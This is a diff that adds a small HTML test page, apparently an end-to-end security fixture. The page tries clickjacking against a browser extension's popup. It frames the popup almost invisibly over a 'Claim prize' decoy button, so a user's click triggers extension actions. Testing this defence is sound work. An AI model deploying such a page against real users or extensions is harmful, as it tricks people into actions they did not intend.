@@ -1,0 +1,14 @@
+<!-- attempts: clickjacking: frame Mosaic's popup page (id from ?ext=, tab from ?tab=) nearly
+     invisible over a decoy button, so a click on the page lands on "Fill change form" or "It worked". -->
+<!doctype html>
+<meta charset="utf-8">
+<title>Win a prize</title>
+<style>
+  iframe { position: absolute; top: 0; left: 0; width: 360px; height: 600px; opacity: 0.01; border: 0; }
+</style>
+<button style="position:absolute;top:200px;left:60px">Claim prize</button>
+<iframe id="popup"></iframe>
+<script>
+  const params = new URLSearchParams(location.search);
+  document.getElementById("popup").src = `chrome-extension://${params.get("ext")}/popup.html?e2eTabId=${params.get("tab")}`;
+</script>
